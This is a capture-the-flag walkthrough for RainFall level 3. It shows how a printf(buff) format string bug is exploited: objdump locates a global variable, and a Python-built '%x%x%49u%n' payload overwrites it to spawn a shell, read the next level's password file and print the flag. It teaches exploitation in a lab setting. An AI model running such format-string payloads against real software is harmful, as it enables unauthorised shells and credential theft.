# Level 3

As usual, there is a binary which we decompiled [here](./level3_decomp.c).

The `return system("/bin/sh")` jumps to our eyes, it requires to pass a check, `m` must be equal to `64`. Easy, right?

We don't have a big impact on aything except the printf located later which prints our buffer. Good news for us, that's all we need.

## Exploit

We will need to change the value of `m` to pass our check and open a shell, so first thing first, we need to find its address:

```bash
level3@RainFall:~$ objdump -t level3 | grep m
level3:     file format elf32-i386
080481b8 l    d  .dynsym        00000000              .dynsym
08048618 l    d  .eh_frame_hdr  00000000              .eh_frame_hdr
08048654 l    d  .eh_frame      00000000              .eh_frame
0804974c l    d  .dynamic       00000000              .dynamic
00000000 l    d  .comment       00000000              .comment
08049884 l     O .bss           00000001              completed.6159
08048480 l     F .text          00000000              frame_dummy
08048734 l     O .eh_frame      00000000              __FRAME_END__
0804974c l     O .dynamic       00000000              _DYNAMIC
00000000       F *UND*          00000000              system@@GLIBC_2.0
00000000  w      *UND*          00000000              __gmon_start__
00000000       F *UND*          00000000              __libc_start_main@@GLIBC_2.0
0804988c g     O .bss           00000004              m
0804851a g     F .text          0000000d              main
level3@RainFall:~$
```

So we know the adress of m: `0804988c`.

Now the fact that `printf(buff)` is used makes it vulnerable compared to `printf("%s\n", buff)`. Which means our string will be replaced like well, inside a printf!

For example: 

```bash
level3@RainFall:~$ ./level3
aaaa %x %x %x %x
aaaa 200 b7fd1ac0 b7ff37d0 61616161
```

It prints our string, then the address of ENV, some more addresses for locals and finally, our string.

And now, we can use something clever, we can input the adress of `m` as the first parameters, then use `%x` to pop the element of the stack until we arrive at the address of `m`, and write what we want!
`%n` is used to write the bytes we wrote with printf, to the last address pushed onto the stack so m, it will write 49 + the previous bytes = 64 to `m`:

<details>
    <summary>Spoiler</summary>

  And now, we can use something clever, we can input the adress of `m` as the first parameters, then use `%x` to pop the element of the stack until we arrive at the address of `m`, and write what we want!
  `%n` is used to write the bytes we wrote with printf, to the last address pushed onto the stack so m, it will write 49 + the previous bytes = 64 to `m`:

    ```bash
    level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%x%x%49u%n"' > /var/crash/write
    level3@RainFall:~$ cat /var/crash/write - | ./level3
    ��200b7fd1ac0                                       3086956496
    Wait what?!
    cat /home/user/level4/.pass
    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
    ```

</details>



### Alternate write

<details>
    <summary>Spoiler</summary>

We can also substitute the `49u` and instead print 38 a, which will produce the same result!

```bash
python2 -c 'print "\x8c\x98\x04\x08" + "%x "*3 + "a"*38 + "%n"' > /var/crash/write
```

</details>

## Flag

b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
